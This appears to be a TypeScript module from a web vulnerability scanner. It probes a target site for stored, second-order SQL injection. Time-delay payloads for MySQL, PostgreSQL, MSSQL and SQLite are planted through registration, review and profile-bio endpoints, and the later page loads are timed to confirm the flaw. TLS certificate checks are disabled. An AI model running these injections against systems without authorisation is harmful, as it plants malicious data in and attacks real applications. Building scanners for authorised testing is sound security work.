import { Job } from 'bullmq';
import { PrismaClient, Severity, VulnerabilityType } from '@prisma/client';
import axios, { AxiosRequestConfig } from 'axios';
import { URL } from 'url';
import http from 'http';
import https from 'https';
import { executeRequest, delay, recordVulnerability } from './common';

// ============================================================================
// ⚙️ CONFIGURATION & CONSTANTS
// ============================================================================

const TIME_DELAY_THRESHOLD = 4000; // 4 seconds
const USER_AGENT = 'DragonSploit/2.0 (Second-Order Scanner)';

// 🚀 Performance: Keep-Alive Agents for POST requests
// نستخدم نفس إعدادات الوكلاء الموجودة في common.ts لضمان السرعة
const httpAgent = new http.Agent({ keepAlive: true, maxSockets: 50 });
const httpsAgent = new https.Agent({ keepAlive: true, maxSockets: 50, rejectUnauthorized: false });

// ============================================================================
// 🛠️ INTERFACES
// ============================================================================

interface InjectionPoint {
    path: string;
    method: 'POST' | 'PUT';
    payloadField: string;
}

interface TriggerPoint {
    path: string;
    method: 'GET';
}

interface AttackVector {
    name: string;
    injectionPoint: InjectionPoint;
    triggerPoint: TriggerPoint;
}

// ============================================================================
// 🛡️ ATTACK LOGIC
// ============================================================================

export async function executeSecondOrderAttack(job: Job, prisma: PrismaClient): Promise<boolean> {
    const { targetUrl, scanId } = job.data;
    console.log('[Vector 4] 🕒 Starting Second-Order SQLi Attack (Stored)...');
    
    let foundVulnerability = false;

    const attackVectors: AttackVector[] = [
        {
            name: "Username to Profile Page",
            injectionPoint: { path: "/api/register", method: "POST", payloadField: "username" },
            triggerPoint: { path: "/api/profile/{userId}", method: "GET" }
        },
        {
            name: "Product Review to Product Page",
            injectionPoint: { path: "/api/products/{productId}/reviews", method: "POST", payloadField: "comment" },
            triggerPoint: { path: "/api/products/{productId}", method: "GET" }
        },
        {
            name: "User Bio to Profile Page",
            injectionPoint: { path: "/api/profile/update", method: "POST", payloadField: "bio" },
            triggerPoint: { path: "/api/profile/{userId}", method: "GET" }
        }
    ];

    const timeBombPayloads = {
        MySQL: (val: string) => `${val}'; SELECT SLEEP(5) --`, // Simplified MySQL
        PostgreSQL: (val: string) => `${val}'; SELECT pg_sleep(5); --`,
        MSSQL: (val: string) => `${val}'; WAITFOR DELAY '0:0:5' --`,
        SQLite: (val: string) => `${val}' AND (SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2 UNION ALL SELECT 3 UNION ALL SELECT 4) AS t1) > 0 --` // Heavy Query
    };

    // Loop through each logical vector
    for (const vector of attackVectors) {
        console.log(`\n[Vector 4] 🎯 Testing Vector: ${vector.name}`);

        // Iterate through DB-specific payloads
        for (const [dbType, payloadFn] of Object.entries(timeBombPayloads)) {
            // تخطي إذا وجدنا ثغرة في هذا الفيكتور بالفعل
            if (foundVulnerability) break; 

            try {
                await runSingleTest(
                    targetUrl, 
                    vector, 
                    dbType, 
                    payloadFn, 
                    scanId, 
                    prisma
                ).then(found => {
                    if (found) foundVulnerability = true;
                });

            } catch (error: any) {
                console.warn(`[Vector 4] ⚠️ Error in ${vector.name} (${dbType}): ${error.message}`);
            }
        }
        if (foundVulnerability) break; // Stop if we confirmed a vulnerability
    }

    return foundVulnerability;
}

// ============================================================================
// ⚡ HELPER FUNCTIONS (The Engine)
// ============================================================================

async function runSingleTest(
    targetUrl: string, 
    vector: AttackVector, 
    dbType: string, 
    payloadFn: (f: string) => string, 
    scanId: string, 
    prisma: PrismaClient
): Promise<boolean> {
    
    // 1. Setup Paths
    // Replace placeholders with defaults or discovered IDs (simplified logic)
    let injectionPath = vector.injectionPoint.path.replace("{productId}", "1");
    let triggerPathTemplate = vector.triggerPoint.path.replace("{productId}", "1");

    const injectionUrl = new URL(injectionPath, targetUrl).toString();
    
    // 2. Phase 1: The Plant (Injection)
    // We need a unique base value to avoid collision
    const uniqueId = Math.random().toString(36).substring(7);
    const baseValue = `user_${uniqueId}`;
    const payloadValue = payloadFn(baseValue);
    
    const injectionPayload = {
        [vector.injectionPoint.payloadField]: payloadValue,
        // Add generic fields often required by registration/update
        password: process.env.TEST_PASSWORD || "password",
        email: `${baseValue}@test.com`
    };

    console.log(`[Vector 4] 💉 Injecting ${dbType} payload into ${vector.name}...`);

    const injectRes = await performPostRequest(injectionUrl, injectionPayload);
    
    if (injectRes.status < 200 || injectRes.status > 299) {
        // Injection failed (e.g., validation error), skip trigger
        return false;
    }

    // Extract userId if returned (crucial for profile triggers)
    let userId = "1"; 
    if (injectRes.data && (injectRes.data.userId || injectRes.data.id)) {
        userId = String(injectRes.data.userId || injectRes.data.id);
    }

    // Wait for DB commit/propagation
    await delay(1000); 

    // 3. Phase 2: The Trigger (Measurement)
    const finalTriggerUrl = new URL(triggerPathTemplate.replace("{userId}", userId), targetUrl).toString();
    
    // Measure Baseline (Clean Request)
    // To be scientifically accurate, we should measure a known clean endpoint, 
    // but here we assume the trigger URL *should* be fast.
    // We take a conservative baseline assumption of 500ms max for a normal app.
    const assumedBaseline = 500; 

    // Trigger Request
    const start = Date.now();
    await executeRequest(finalTriggerUrl); // Using common's optimized GET
    const duration = Date.now() - start;

    console.log(`[Vector 4] ⏱️ Trigger Duration: ${duration}ms (Threshold: ${assumedBaseline + TIME_DELAY_THRESHOLD}ms)`);

    if (duration > (assumedBaseline + TIME_DELAY_THRESHOLD)) {
        console.log(`[Vector 4] ✅ Second-Order SQLi CONFIRMED (${dbType})`);
        
        const proof = `
            Vector: ${vector.name}
            Database: ${dbType}
            Injection URL: ${injectionUrl}
            Trigger URL: ${finalTriggerUrl}
            Payload: ${payloadValue}
            Execution Time: ${duration}ms
        `.trim();

        const description = `Stored (Second-Order) SQL Injection detected. The payload was stored via '${vector.injectionPoint.path}' and executed when visiting '${vector.triggerPoint.path}'.`;

        await recordVulnerability(prisma, scanId, VulnerabilityType.SQL_INJECTION, Severity.HIGH, description, proof);
        return true;
    }

    return false;
}

/**
 * Optimized POST request helper using Keep-Alive agents.
 */
async function performPostRequest(url: string, data: any): Promise<{ status: number, data: any }> {
    try {
        const config: AxiosRequestConfig = {
            method: 'POST',
            url: url,
            data: data,
            headers: { 
                'User-Agent': USER_AGENT,
                'Content-Type': 'application/json' 
            },
            timeout: 10000,
            validateStatus: () => true, // Handle all codes manually
            httpAgent,  // ✅ Performance Key
            httpsAgent  // ✅ Performance Key
        };

        const response = await axios(config);
        return { status: response.status, data: response.data };
    } catch (error) {
        return { status: 0, data: null };
    }
}